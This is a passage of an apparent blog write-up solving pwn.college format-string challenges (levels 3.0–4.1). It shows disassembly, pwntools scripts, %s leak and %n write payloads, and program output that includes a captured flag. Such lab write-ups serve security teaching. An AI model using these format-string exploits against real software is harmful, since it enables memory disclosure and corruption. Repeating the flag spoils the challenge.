+<span id="cb6-108"><a href="#cb6-108" aria-hidden="true" tabindex="-1"></a>   0x00000000004016ee &lt;+558&gt;:	<span class="kw">mov</span>    <span class="kw">edi</span><span class="op">,</span><span class="bn">0xa</span></span>
+<span id="cb6-109"><a href="#cb6-109" aria-hidden="true" tabindex="-1"></a>   0x00000000004016f3 &lt;+563&gt;:	<span class="cf">call</span>   <span class="bn">0x4010e0</span> <span class="op">&lt;</span>putchar@plt<span class="op">&gt;</span></span>
+<span id="cb6-110"><a href="#cb6-110" aria-hidden="true" tabindex="-1"></a>   0x00000000004016f8 &lt;+568&gt;:	<span class="kw">nop</span></span>
+<span id="cb6-111"><a href="#cb6-111" aria-hidden="true" tabindex="-1"></a>   0x00000000004016f9 &lt;+569&gt;:	<span class="kw">mov</span>    <span class="kw">rax</span><span class="op">,</span><span class="dt">QWORD</span> <span class="dt">PTR</span> <span class="op">[</span><span class="kw">rbp</span><span class="op">-</span><span class="bn">0x8</span><span class="op">]</span></span>
+<span id="cb6-112"><a href="#cb6-112" aria-hidden="true" tabindex="-1"></a>   0x00000000004016fd &lt;+573&gt;:	<span class="kw">xor</span>    <span class="kw">rax</span><span class="op">,</span><span class="dt">QWORD</span> <span class="dt">PTR</span> <span class="kw">fs</span><span class="op">:</span><span class="bn">0x28</span></span>
+<span id="cb6-113"><a href="#cb6-113" aria-hidden="true" tabindex="-1"></a>   0x0000000000401706 &lt;+582&gt;:	<span class="cf">je</span>     <span class="bn">0x40170d</span> <span class="op">&lt;</span>func<span class="op">+</span><span class="dv">589</span><span class="op">&gt;</span></span>
+<span id="cb6-114"><a href="#cb6-114" aria-hidden="true" tabindex="-1"></a>   0x0000000000401708 &lt;+584&gt;:	<span class="cf">call</span>   <span class="bn">0x401100</span> <span class="op">&lt;</span>__stack_chk_fail@plt<span class="op">&gt;</span></span>
+<span id="cb6-115"><a href="#cb6-115" aria-hidden="true" tabindex="-1"></a>   0x000000000040170d &lt;+589&gt;:	<span class="kw">leave</span></span>
+<span id="cb6-116"><a href="#cb6-116" aria-hidden="true" tabindex="-1"></a>   0x000000000040170e &lt;+590&gt;:	<span class="cf">ret</span></span>
+<span id="cb6-117"><a href="#cb6-117" aria-hidden="true" tabindex="-1"></a>End of assembler dump<span class="op">.</span></span></code></pre></div>
+<h3 id="solve"><a href="#solve" class="anchor">#</a>solve</h3>
+<p>format specifiers to keep in mind:</p>
+<ul>
+<li>%s (string) =</li>
+<li>%d (decimal)</li>
+<li>%p (memory address/pointer value)</li>
+<li>%x (hexadecimal integer)</li>
+<li>%lx (long hexadecimal integer)</li>
+</ul>
+<p>started with this payload just to see where i was landing:</p>
+<div class="sourceCode" id="cb7"><pre class="sourceCode python"><code class="sourceCode python"><span id="cb7-1"><a href="#cb7-1" aria-hidden="true" tabindex="-1"></a><span class="im">from</span> pwn <span class="im">import</span> <span class="op">*</span></span>
+<span id="cb7-2"><a href="#cb7-2" aria-hidden="true" tabindex="-1"></a>context.arch <span class="op">=</span> <span class="st">&#39;amd64&#39;</span></span>
+<span id="cb7-3"><a href="#cb7-3" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb7-4"><a href="#cb7-4" aria-hidden="true" tabindex="-1"></a>p <span class="op">=</span> process(<span class="st">&#39;./babyfmt_level3.0&#39;</span>)</span>
+<span id="cb7-5"><a href="#cb7-5" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb7-6"><a href="#cb7-6" aria-hidden="true" tabindex="-1"></a>payload <span class="op">=</span> <span class="st">b&#39;AAAAAAAA&#39;</span> <span class="op">+</span> <span class="st">&quot;&quot;</span>.join(<span class="ss">f&quot;.</span><span class="sc">{</span>i<span class="sc">}</span><span class="ss">=%</span><span class="sc">{</span>i<span class="sc">}</span><span class="ss">$lx&quot;</span> <span class="cf">for</span> i <span class="kw">in</span> <span class="bu">range</span>(<span class="dv">15</span>, <span class="dv">35</span>)).encode()</span>
+<span id="cb7-7"><a href="#cb7-7" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb7-8"><a href="#cb7-8" aria-hidden="true" tabindex="-1"></a>p.send(payload)</span>
+<span id="cb7-9"><a href="#cb7-9" aria-hidden="true" tabindex="-1"></a><span class="bu">print</span>(p.recvall())</span></code></pre></div>
+<pre><code>Send your data!\nReceived 208 bytes!\n\nI will now call printf on your data!\n\nAAAAAAAA.15=0.16=0.17=0.18=d000000000.19=0.20=0.21=0.22=0.23=0.24=0.25=0.26=4141414100000000.27=3d35312e41414141.28=312e786c24353125.29=786c243631253d36.30=243731253d37312e.31=31253d38312e786c.32=3d39312e786c2438.33=322e786c24393125.34=786c243032253d30\n### Goodbye!\n&quot;</code></pre>
+<p>looks like we are starting 4 bytes offset/misaligned (on top of our already exising 8) for whatever reason</p>
+<p>tried this payload to see if we can get a clean offset/slot:</p>
+<div class="sourceCode" id="cb9"><pre class="sourceCode python"><code class="sourceCode python"><span id="cb9-1"><a href="#cb9-1" aria-hidden="true" tabindex="-1"></a>payload <span class="op">=</span> <span class="st">b&#39;AAAAAAAA&#39;</span> <span class="op">+</span> <span class="st">b&#39;BBBB&#39;</span> <span class="op">+</span> <span class="st">&quot;&quot;</span>.join(<span class="ss">f&quot;.</span><span class="sc">{</span>i<span class="sc">}</span><span class="ss">=%</span><span class="sc">{</span>i<span class="sc">}</span><span class="ss">$lx&quot;</span> <span class="cf">for</span> i <span class="kw">in</span> <span class="bu">range</span>(<span class="dv">15</span>, <span class="dv">35</span>)).encode()</span></code></pre></div>
+<div class="sourceCode" id="cb10"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb10-1"><a href="#cb10-1" aria-hidden="true" tabindex="-1"></a><span class="ex">hacker@format-string-exploits~level3-0:~$</span> /run/dojo/bin/python /home/hacker/solve.py</span>
+<span id="cb10-2"><a href="#cb10-2" aria-hidden="true" tabindex="-1"></a><span class="ex">[+]</span> Starting local process <span class="st">&#39;/challenge/babyfmt_level3.0&#39;</span>: pid 868</span>
+<span id="cb10-3"><a href="#cb10-3" aria-hidden="true" tabindex="-1"></a><span class="ex">[+]</span> Receiving all data: Done <span class="er">(</span><span class="ex">329B</span><span class="kw">)</span></span>
+<span id="cb10-4"><a href="#cb10-4" aria-hidden="true" tabindex="-1"></a><span class="ex">[*]</span> Process <span class="st">&#39;/challenge/babyfmt_level3.0&#39;</span> stopped with exit code 0 <span class="er">(</span><span class="ex">pid</span> 868<span class="kw">)</span></span>
+<span id="cb10-5"><a href="#cb10-5" aria-hidden="true" tabindex="-1"></a><span class="ex">b</span><span class="st">&#39;Received 212 bytes!\n\nI will now call printf on your data!\n\nAAAAAAAABBBB.15=0.16=0.17=0.18=d400000000.19=0.20=0.21=0.22=0.23=0.24=0.25=0.26=4141414100000000.27=4242424241414141.28=243531253d35312e.29=31253d36312e786c.30=3d37312e786c2436.31=312e786c24373125.32=786c243831253d38.33=243931253d39312e.34=32253d30322e786c\n### Goodbye!\n&#39;</span></span></code></pre></div>
+<p>try dereferencing address:</p>
+<div class="sourceCode" id="cb11"><pre class="sourceCode python"><code class="sourceCode python"><span id="cb11-1"><a href="#cb11-1" aria-hidden="true" tabindex="-1"></a>payload <span class="op">=</span> <span class="st">b&#39;%28$s&#39;</span>.ljust(<span class="dv">12</span>, <span class="st">b&#39;A&#39;</span>) <span class="op">+</span> bss   <span class="co"># final payload -_-</span></span></code></pre></div>
+<div class="sourceCode" id="cb12"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb12-1"><a href="#cb12-1" aria-hidden="true" tabindex="-1"></a><span class="ex">hacker@format-string-exploits~level3-0:~$</span> /run/dojo/bin/python /home/hacker/solve.py</span>
+<span id="cb12-2"><a href="#cb12-2" aria-hidden="true" tabindex="-1"></a><span class="ex">[+]</span> Starting local process <span class="st">&#39;/challenge/babyfmt_level3.0&#39;</span>: pid 1389</span>
+<span id="cb12-3"><a href="#cb12-3" aria-hidden="true" tabindex="-1"></a><span class="ex">[+]</span> Receiving all data: Done <span class="er">(</span><span class="ex">140B</span><span class="kw">)</span></span>
+<span id="cb12-4"><a href="#cb12-4" aria-hidden="true" tabindex="-1"></a><span class="ex">[*]</span> Process <span class="st">&#39;/challenge/babyfmt_level3.0&#39;</span> stopped with exit code 0 <span class="er">(</span><span class="ex">pid</span> 1389<span class="kw">)</span></span>
+<span id="cb12-5"><a href="#cb12-5" aria-hidden="true" tabindex="-1"></a><span class="ex">b</span><span class="st">&#39;Received 20 bytes!\n\nI will now call printf on your data!\n\npwn.college{45tESBTnEyp_Lui6R4WzGhJlTvw.dBjM0MDL3UzM1YzW}\nAAAAAAA@A@\n### Goodbye!\n&#39;</span></span></code></pre></div>
+<h2 id="level-31"><a href="#level-31" class="anchor">#</a>level 3.1</h2>
+<h3 id="challenge-info"><a href="#challenge-info" class="anchor">#</a>challenge info</h3>
+<p>same thing as 3.0, only difference is we are <strong>NOT</strong> given the <code>flag</code> address, so we have to figure that out on our own</p>
+<h3 id="static-analysis-via-ida-pro"><a href="#static-analysis-via-ida-pro" class="anchor">#</a>static analysis via ida pro</h3>
+<p>pseudocode for <code>func</code>:<br />
+<img src="/images/pwncollege-formatstring/clipboard-20261031T015117.png" /><br />
+this particular snippet gives away the address of the flag (comments are mine):</p>
+<div class="sourceCode" id="cb13"><pre class="sourceCode c"><code class="sourceCode c"><span id="cb13-1"><a href="#cb13-1" aria-hidden="true" tabindex="-1"></a>v1 <span class="op">=</span> open<span class="op">(</span><span class="st">&quot;/flag&quot;</span><span class="op">,</span> <span class="dv">0</span><span class="op">);</span>        <span class="co">// open /flag, store the file descriptor in v1</span></span>
+<span id="cb13-2"><a href="#cb13-2" aria-hidden="true" tabindex="-1"></a>read<span class="op">(</span>v1<span class="op">,</span> <span class="op">&amp;</span>unk_404110<span class="op">,</span> <span class="bn">0x80</span><span class="bu">u</span><span class="op">);</span> <span class="co">// copy up to 128 bytes FROM the file (v1) INTO memory at 0x404110</span></span></code></pre></div>
+<h3 id="solve-1"><a href="#solve-1" class="anchor">#</a>solve</h3>
+<p>try to get a clean offset/slot:</p>
+<div class="sourceCode" id="cb14"><pre class="sourceCode python"><code class="sourceCode python"><span id="cb14-1"><a href="#cb14-1" aria-hidden="true" tabindex="-1"></a><span class="im">from</span> pwn <span class="im">import</span> <span class="op">*</span></span>
+<span id="cb14-2"><a href="#cb14-2" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb14-3"><a href="#cb14-3" aria-hidden="true" tabindex="-1"></a>context.arch <span class="op">=</span> <span class="st">&#39;amd64&#39;</span></span>
+<span id="cb14-4"><a href="#cb14-4" aria-hidden="true" tabindex="-1"></a>bss <span class="op">=</span> p64(<span class="bn">0x404110</span>)</span>
+<span id="cb14-5"><a href="#cb14-5" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb14-6"><a href="#cb14-6" aria-hidden="true" tabindex="-1"></a>p <span class="op">=</span> process(<span class="st">&#39;/challenge/babyfmt_level3.1&#39;</span>)</span>
+<span id="cb14-7"><a href="#cb14-7" aria-hidden="true" tabindex="-1"></a>p.recvuntil(<span class="st">b&#39;Send your data!</span><span class="ch">\n</span><span class="st">&#39;</span>)</span>
+<span id="cb14-8"><a href="#cb14-8" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb14-9"><a href="#cb14-9" aria-hidden="true" tabindex="-1"></a>payload <span class="op">=</span> <span class="st">b&#39;A&#39;</span> <span class="op">*</span> <span class="dv">8</span> <span class="op">+</span> <span class="st">&quot;&quot;</span>.join(<span class="ss">f&quot;.</span><span class="sc">{</span>i<span class="sc">}</span><span class="ss">=%</span><span class="sc">{</span>i<span class="sc">}</span><span class="ss">$lx&quot;</span> <span class="cf">for</span> i <span class="kw">in</span> <span class="bu">range</span>(<span class="dv">15</span>, <span class="dv">35</span>)).encode()</span>
+<span id="cb14-10"><a href="#cb14-10" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb14-11"><a href="#cb14-11" aria-hidden="true" tabindex="-1"></a>p.send(payload)</span>
+<span id="cb14-12"><a href="#cb14-12" aria-hidden="true" tabindex="-1"></a><span class="bu">print</span>(p.recvall())</span></code></pre></div>
+<p><img src="/images/pwncollege-formatstring/clipboard-20261031T030256.png" /></p>
+<p>i kept on playing/tweaking the amount of bytes until I finally got a clean slot, keep in mind that this method is good for getting a ballpark estimate of which slot to shoot for, but it won't be exact:</p>
+<div class="sourceCode" id="cb15"><pre class="sourceCode c"><code class="sourceCode c"><span id="cb15-1"><a href="#cb15-1" aria-hidden="true" tabindex="-1"></a>payload <span class="op">=</span> b<span class="ch">&#39;A&#39;</span> <span class="op">*</span> <span class="dv">11</span> <span class="op">+</span> <span class="st">&quot;&quot;</span><span class="op">.</span>join<span class="op">(</span>f<span class="st">&quot;.{i}=%{i}$lx&quot;</span> <span class="cf">for</span> i in range<span class="op">(</span><span class="dv">15</span><span class="op">,</span> <span class="dv">35</span><span class="op">)).</span>encode<span class="op">()</span></span></code></pre></div>
+<p><img src="/images/pwncollege-formatstring/clipboard-20261031T030938.png" /></p>
+<p>then i made a pseudo-payload to see if I could find the real slot, which I know has to be around 22:</p>
+<div class="sourceCode" id="cb16"><pre class="sourceCode python"><code class="sourceCode python"><span id="cb16-1"><a href="#cb16-1" aria-hidden="true" tabindex="-1"></a>payload <span class="op">=</span> <span class="st">b&#39;%22$lx&#39;</span>.ljust(<span class="dv">11</span>, <span class="st">b&#39;A&#39;</span>) <span class="op">+</span> bss</span></code></pre></div>
+<p><img src="/images/pwncollege-formatstring/clipboard-20261031T031930.png" /><br />
+still not seeing the address i'm trying to dereference though...</p>
+<div class="sourceCode" id="cb17"><pre class="sourceCode python"><code class="sourceCode python"><span id="cb17-1"><a href="#cb17-1" aria-hidden="true" tabindex="-1"></a>payload <span class="op">=</span> <span class="st">b&#39;%23$lx&#39;</span>.ljust(<span class="dv">11</span>, <span class="st">b&#39;A&#39;</span>) <span class="op">+</span> bss</span></code></pre></div>
+<p><img src="/images/pwncollege-formatstring/clipboard-20261031T032129.png" /></p>
+<p>BANG! now just dereference the address (change format specifier to %s):</p>
+<div class="sourceCode" id="cb18"><pre class="sourceCode python"><code class="sourceCode python"><span id="cb18-1"><a href="#cb18-1" aria-hidden="true" tabindex="-1"></a>payload <span class="op">=</span> <span class="st">b&#39;%23$s&#39;</span>.ljust(<span class="dv">11</span>, <span class="st">b&#39;A&#39;</span>) <span class="op">+</span> bss   <span class="co"># final payload -_-</span></span></code></pre></div>
+<p><img src="/images/pwncollege-formatstring/clipboard-20261031T015701.png" /></p>
+<h2 id="level-40"><a href="#level-40" class="anchor">#</a>level 4.0</h2>
+<p>okay this time the objective is to use a format string exploit to <em>SET</em> a global variable</p>
+<pre><code>$ ./babyfmt_level4.0
+###
+### Welcome to ./babyfmt_level4.0!
+###
+
+This challenge reads in some bytes, calls printf on that string, and allows you to perform
+a format string attack. Through this series of challenges, you will become painfully familiar
+with the concept of Format String Attacks!
+
+This challenge allows you to make a 256-sized format string.
+
+This challenge requires you to set a win value, located in the .bss, to 0xb8. If you successfully
+pull that off, the challenge will give you the flag! You will need to use %n to set this value
+
+The win value in the .bss is located at 0x404150! Remember to write this in little endian in your format string.
+Remember, you can swap %n with %lx to see what address you will be writing into to make sure you have the.correct offset.
+
+I will now read up to 256 bytes. Send your data!</code></pre>
+<h3 id="finding-correct-padding--slot"><a href="#finding-correct-padding--slot" class="anchor">#</a>finding correct padding + slot</h3>
+<p>started off with just 8 'A's, kept playing/messing with it, until eventually I landed on this:</p>
+<div class="sourceCode" id="cb20"><pre class="sourceCode python"><code class="sourceCode python"><span id="cb20-1"><a href="#cb20-1" aria-hidden="true" tabindex="-1"></a>payload <span class="op">=</span> <span class="st">b&#39;A&#39;</span><span class="op">*</span> <span class="dv">5</span></span>
+<span id="cb20-2"><a href="#cb20-2" aria-hidden="true" tabindex="-1"></a>payload <span class="op">+=</span> <span class="st">b&#39;B&#39;</span><span class="op">*</span> <span class="dv">8</span></span>
+<span id="cb20-3"><a href="#cb20-3" aria-hidden="true" tabindex="-1"></a>payload <span class="op">+=</span> <span class="st">b&#39;&#39;</span>.join(<span class="ss">f&#39;.</span><span class="sc">{</span>i<span class="sc">}</span><span class="ss">=%</span><span class="sc">{</span>i<span class="sc">}</span><span class="ss">$lx&#39;</span>.encode() <span class="cf">for</span> i <span class="kw">in</span> <span class="bu">range</span>(<span class="dv">12</span>, <span class="dv">40</span>))</span></code></pre></div>
+<p><img src="/images/pwncollege-formatstring/clipboard-20261031T154702.png" /></p>
+<h3 id="n-gimmick"><a href="#n-gimmick" class="anchor">#</a>%n gimmick</h3>
+<p>so now all i've gotta do is write the value <code>0xb8</code> into the variable stored at <code>0x404150</code> (using %n). remember, unlike <code>%x</code> or <code>%p</code>, <code>%n</code> just writes the number of characters printed <em>so far</em> into an integer variable</p>
+<p>the problem? we can't just do something like</p>
+<div class="sourceCode" id="cb21"><pre class="sourceCode python"><code class="sourceCode python"><span id="cb21-1"><a href="#cb21-1" aria-hidden="true" tabindex="-1"></a>target <span class="op">=</span> <span class="st">b&#39;0xb8&#39;</span></span></code></pre></div>
+<p>because %n doesn't write whatever we want, it just writes the amount of characters printed. so the work around is to send 0xb8 in decimal form (which is just 184)</p>
+<h3 id="solve-2"><a href="#solve-2" class="anchor">#</a>solve</h3>
+<div class="sourceCode" id="cb22"><pre class="sourceCode python"><code class="sourceCode python"><span id="cb22-1"><a href="#cb22-1" aria-hidden="true" tabindex="-1"></a>spec <span class="op">=</span> <span class="st">b&#39;%184c%32$n&#39;</span></span>
+<span id="cb22-2"><a href="#cb22-2" aria-hidden="true" tabindex="-1"></a>payload <span class="op">=</span> spec.ljust(<span class="dv">13</span>, <span class="st">b&#39;A&#39;</span>) <span class="op">+</span> p64(<span class="bn">0x404150</span>)</span></code></pre></div>
+<h2 id="level-41"><a href="#level-41" class="anchor">#</a>level 4.1</h2>
+<h3 id="check_win"><a href="#check_win" class="anchor">#</a>check_win</h3>
+<div class="sourceCode" id="cb23"><pre class="sourceCode nasm"><code class="sourceCode nasm"><span id="cb23-1"><a href="#cb23-1" aria-hidden="true" tabindex="-1"></a>pwndbg<span class="op">&gt;</span> disass check_win</span>
+<span id="cb23-2"><a href="#cb23-2" aria-hidden="true" tabindex="-1"></a>Dump of assembler code for function check_win<span class="op">:</span></span>
+<span id="cb23-3"><a href="#cb23-3" aria-hidden="true" tabindex="-1"></a>   0x00000000004012dd &lt;+0&gt;:     <span class="kw">endbr64</span></span>
+<span id="cb23-4"><a href="#cb23-4" aria-hidden="true" tabindex="-1"></a>   0x00000000004012e1 &lt;+4&gt;:     <span class="kw">push</span>   <span class="kw">rbp</span></span>
+<span id="cb23-5"><a href="#cb23-5" aria-hidden="true" tabindex="-1"></a>   0x00000000004012e2 &lt;+5&gt;:     <span class="kw">mov</span>    <span class="kw">rbp</span><span class="op">,</span><span class="kw">rsp</span></span>
+<span id="cb23-6"><a href="#cb23-6" aria-hidden="true" tabindex="-1"></a>   0x00000000004012e5 &lt;+8&gt;:     <span class="kw">sub</span>    <span class="kw">rsp</span><span class="op">,</span><span class="bn">0x10</span></span>
+<span id="cb23-7"><a href="#cb23-7" aria-hidden="true" tabindex="-1"></a>   0x00000000004012e9 &lt;+12&gt;:    <span class="kw">mov</span>    <span class="dt">QWORD</span> <span class="dt">PTR</span> <span class="op">[</span><span class="kw">rbp</span><span class="op">-</span><span class="bn">0x8</span><span class="op">],</span><span class="kw">rdi</span></span>
+<span id="cb23-8"><a href="#cb23-8" aria-hidden="true" tabindex="-1"></a>   0x00000000004012ed &lt;+16&gt;:    <span class="kw">lea</span>    <span class="kw">rdi</span><span class="op">,[</span><span class="kw">rip</span><span class="op">+</span><span class="bn">0xd14</span><span class="op">]</span>        # <span class="bn">0x402008</span></span>
+<span id="cb23-9"><a href="#cb23-9" aria-hidden="true" tabindex="-1"></a>   0x00000000004012f4 &lt;+23&gt;:    <span class="cf">call</span>   <span class="bn">0x401100</span> <span class="op">&lt;</span>puts@plt<span class="op">&gt;</span></span>
+<span id="cb23-10"><a href="#cb23-10" aria-hidden="true" tabindex="-1"></a>   0x00000000004012f9 &lt;+28&gt;:    <span class="kw">mov</span>    <span class="kw">esi</span><span class="op">,</span><span class="bn">0xad</span></span>
+<span id="cb23-11"><a href="#cb23-11" aria-hidden="true" tabindex="-1"></a>   0x00000000004012fe &lt;+33&gt;:    <span class="kw">lea</span>    <span class="kw">rdi</span><span class="op">,[</span><span class="kw">rip</span><span class="op">+</span><span class="bn">0xd19</span><span class="op">]</span>        # <span class="bn">0x40201e</span></span>
+<span id="cb23-12"><a href="#cb23-12" aria-hidden="true" tabindex="-1"></a>   0x0000000000401305 &lt;+40&gt;:    <span class="kw">mov</span>    <span class="kw">eax</span><span class="op">,</span><span class="bn">0x0</span></span>
+<span id="cb23-13"><a href="#cb23-13" aria-hidden="true" tabindex="-1"></a>   0x000000000040130a &lt;+45&gt;:    <span class="cf">call</span>   <span class="bn">0x401130</span> <span class="op">&lt;</span>printf@plt<span class="op">&gt;</span></span>
+<span id="cb23-14"><a href="#cb23-14" aria-hidden="true" tabindex="-1"></a>   0x000000000040130f &lt;+50&gt;:    <span class="kw">mov</span>    <span class="kw">rax</span><span class="op">,</span><span class="dt">QWORD</span> <span class="dt">PTR</span> <span class="op">[</span><span class="kw">rip</span><span class="op">+</span><span class="bn">0x2e1a</span><span class="op">]</span>        # <span class="bn">0x404130</span> <span class="op">&lt;</span><span class="kw">global</span><span class="op">+</span><span class="dv">80</span><span class="op">&gt;</span></span>
+<span id="cb23-15"><a href="#cb23-15" aria-hidden="true" tabindex="-1"></a>   0x0000000000401316 &lt;+57&gt;:    <span class="kw">mov</span>    <span class="kw">rsi</span><span class="op">,</span><span class="kw">rax</span></span>
+<span id="cb23-16"><a href="#cb23-16" aria-hidden="true" tabindex="-1"></a>   0x0000000000401319 &lt;+60&gt;:    <span class="kw">lea</span>    <span class="kw">rdi</span><span class="op">,[</span><span class="kw">rip</span><span class="op">+</span><span class="bn">0xd1b</span><span class="op">]</span>        # <span class="bn">0x40203b</span></span>
+<span id="cb23-17"><a href="#cb23-17" aria-hidden="true" tabindex="-1"></a>   0x0000000000401320 &lt;+67&gt;:    <span class="kw">mov</span>    <span class="kw">eax</span><span class="op">,</span><span class="bn">0x0</span></span>
+<span id="cb23-18"><a href="#cb23-18" aria-hidden="true" tabindex="-1"></a>   0x0000000000401325 &lt;+72&gt;:    <span class="cf">call</span>   <span class="bn">0x401130</span> <span class="op">&lt;</span>printf@plt<span class="op">&gt;</span></span>
+<span id="cb23-19"><a href="#cb23-19" aria-hidden="true" tabindex="-1"></a>   0x000000000040132a &lt;+77&gt;:    <span class="kw">mov</span>    <span class="kw">rax</span><span class="op">,</span><span class="dt">QWORD</span> <span class="dt">PTR</span> <span class="op">[</span><span class="kw">rip</span><span class="op">+</span><span class="bn">0x2dff</span><span class="op">]</span>        # <span class="bn">0x404130</span> <span class="op">&lt;</span><span class="kw">global</span><span class="op">+</span><span class="dv">80</span><span class="op">&gt;</span></span>
+<span id="cb23-20"><a href="#cb23-20" aria-hidden="true" tabindex="-1"></a>   0x0000000000401331 &lt;+84&gt;:    <span class="kw">cmp</span>    <span class="kw">rax</span><span class="op">,</span><span class="bn">0xad</span></span>
+<span id="cb23-21"><a href="#cb23-21" aria-hidden="true" tabindex="-1"></a>   0x0000000000401337 &lt;+90&gt;:    <span class="cf">jne</span>    <span class="bn">0x401373</span> <span class="op">&lt;</span>check_win<span class="op">+</span><span class="dv">150</span><span class="op">&gt;</span></span>
+<span id="cb23-22"><a href="#cb23-22" aria-hidden="true" tabindex="-1"></a>   0x0000000000401339 &lt;+92&gt;:    <span class="kw">lea</span>    <span class="kw">rdi</span><span class="op">,[</span><span class="kw">rip</span><span class="op">+</span><span class="bn">0xd18</span><span class="op">]</span>        # <span class="bn">0x402058</span></span>
+<span id="cb23-23"><a href="#cb23-23" aria-hidden="true" tabindex="-1"></a>   0x0000000000401340 &lt;+99&gt;:    <span class="cf">call</span>   <span class="bn">0x401100</span> <span class="op">&lt;</span>puts@plt<span class="op">&gt;</span></span>
+<span id="cb23-24"><a href="#cb23-24" aria-hidden="true" tabindex="-1"></a>   0x0000000000401345 &lt;+104&gt;:   <span class="kw">mov</span>    <span class="kw">esi</span><span class="op">,</span><span class="bn">0x0</span></span>
+<span id="cb23-25"><a href="#cb23-25" aria-hidden="true" tabindex="-1"></a>   0x000000000040134a &lt;+109&gt;:   <span class="kw">lea</span>    <span class="kw">rdi</span><span class="op">,[</span><span class="kw">rip</span><span class="op">+</span><span class="bn">0xd27</span><span class="op">]</span>        # <span class="bn">0x402078</span></span>
+<span id="cb23-26"><a href="#cb23-26" aria-hidden="true" tabindex="-1"></a>   0x0000000000401351 &lt;+116&gt;:   <span class="kw">mov</span>    <span class="kw">eax</span><span class="op">,</span><span class="bn">0x0</span></span>
+<span id="cb23-27"><a href="#cb23-27" aria-hidden="true" tabindex="-1"></a>   0x0000000000401356 &lt;+121&gt;:   <span class="cf">call</span>   <span class="bn">0x4011a0</span> <span class="op">&lt;</span>open@plt<span class="op">&gt;</span></span>
+<span id="cb23-28"><a href="#cb23-28" aria-hidden="true" tabindex="-1"></a>   0x000000000040135b &lt;+126&gt;:   <span class="kw">mov</span>    <span class="kw">ecx</span><span class="op">,</span><span class="bn">0x80</span></span>
+<span id="cb23-29"><a href="#cb23-29" aria-hidden="true" tabindex="-1"></a>   0x0000000000401360 &lt;+131&gt;:   <span class="kw">mov</span>    <span class="kw">edx</span><span class="op">,</span><span class="bn">0x0</span></span>
+<span id="cb23-30"><a href="#cb23-30" aria-hidden="true" tabindex="-1"></a>   0x0000000000401365 &lt;+136&gt;:   <span class="kw">mov</span>    <span class="kw">esi</span><span class="op">,</span><span class="kw">eax</span></span>
+<span id="cb23-31"><a href="#cb23-31" aria-hidden="true" tabindex="-1"></a>   0x0000000000401367 &lt;+138&gt;:   <span class="kw">mov</span>    <span class="kw">edi</span><span class="op">,</span><span class="bn">0x1</span></span>
+<span id="cb23-32"><a href="#cb23-32" aria-hidden="true" tabindex="-1"></a>   0x000000000040136c &lt;+143&gt;:   <span class="cf">call</span>   <span class="bn">0x401180</span> <span class="op">&lt;</span>sendfile@plt<span class="op">&gt;</span></span>
+<span id="cb23-33"><a href="#cb23-33" aria-hidden="true" tabindex="-1"></a>   0x0000000000401371 &lt;+148&gt;:   <span class="cf">jmp</span>    <span class="bn">0x40137f</span> <span class="op">&lt;</span>check_win<span class="op">+</span><span class="dv">162</span><span class="op">&gt;</span></span>
+<span id="cb23-34"><a href="#cb23-34" aria-hidden="true" tabindex="-1"></a>   0x0000000000401373 &lt;+150&gt;:   <span class="kw">lea</span>    <span class="kw">rdi</span><span class="op">,[</span><span class="kw">rip</span><span class="op">+</span><span class="bn">0xd04</span><span class="op">]</span>        # <span class="bn">0x40207e</span></span>
+<span id="cb23-35"><a href="#cb23-35" aria-hidden="true" tabindex="-1"></a>   0x000000000040137a &lt;+157&gt;:   <span class="cf">call</span>   <span class="bn">0x401100</span> <span class="op">&lt;</span>puts@plt<span class="op">&gt;</span></span>
+<span id="cb23-36"><a href="#cb23-36" aria-hidden="true" tabindex="-1"></a>   0x000000000040137f &lt;+162&gt;:   <span class="kw">nop</span></span>
+<span id="cb23-37"><a href="#cb23-37" aria-hidden="true" tabindex="-1"></a>   0x0000000000401380 &lt;+163&gt;:   <span class="kw">leave</span></span>
+<span id="cb23-38"><a href="#cb23-38" aria-hidden="true" tabindex="-1"></a>   0x0000000000401381 &lt;+164&gt;:   <span class="cf">ret</span></span>
+<span id="cb23-39"><a href="#cb23-39" aria-hidden="true" tabindex="-1"></a>End of assembler dump<span class="op">.</span></span></code></pre></div>
+<p>addr we want is <code>0x404130</code>, value we want is <code>0xad</code>, which in decimal is 173</p>
+<h3 id="finding-clean-slot"><a href="#finding-clean-slot" class="anchor">#</a>finding clean slot</h3>
+<div class="sourceCode" id="cb24"><pre class="sourceCode python"><code class="sourceCode python"><span id="cb24-1"><a href="#cb24-1" aria-hidden="true" tabindex="-1"></a>payload <span class="op">=</span> <span class="st">b&#39;A&#39;</span><span class="op">*</span> <span class="dv">8</span></span>
+<span id="cb24-2"><a href="#cb24-2" aria-hidden="true" tabindex="-1"></a>payload <span class="op">+=</span> <span class="st">b&#39;&#39;</span>.join(<span class="ss">f&#39;.</span><span class="sc">{</span>i<span class="sc">}</span><span class="ss">=%</span><span class="sc">{</span>i<span class="sc">}</span><span class="ss">$lx&#39;</span>.encode() <span class="cf">for</span> i <span class="kw">in</span> <span class="bu">range</span>(<span class="dv">12</span>, <span class="dv">40</span>))</span></code></pre></div>
+<p>returns:</p>
+<div class="sourceCode" id="cb25"><pre class="sourceCode python"><code class="sourceCode python"><span id="cb25-1"><a href="#cb25-1" aria-hidden="true" tabindex="-1"></a><span class="st">b&quot;Received 256 bytes!</span><span class="ch">\n\n</span><span class="st">I will now call printf on your data!</span><span class="ch">\n\n</span><span class="st">AAAAAAAA.12=0.13=0.14=0.15=0.16=10000000000.17=0.18=4141414141414141.19=243231253d32312e.20=31253d33312e786c.21=3d34312e786c2433.22=312e786c24343125.23=786c243531253d35.24=243631253d36312e.25=31253d37312e786c.26=3d38312e786c2437.27=312e786c24383125.28=786c243931253d39.29=243032253d30322e.30=32253d31322e786c.31=3d32322e786c2431.32=322e786c24323225.33=786c243332253d33.34=243432253d34322e.35=32253d35322e786c.36=%</span><span class="ch">\n</span><span class="st">And now, let&#39;s check the win value!</span><span class="ch">\n</span><span class="st">Checking win value...</span><span class="ch">\n</span><span class="st">... desired win value: 0xad</span><span class="ch">\n</span><span class="st">... written win value: 0</span><span class="ch">\n</span><span class="st">... INCORRECT!</span><span class="ch">\n</span><span class="st">### Goodbye!</span><span 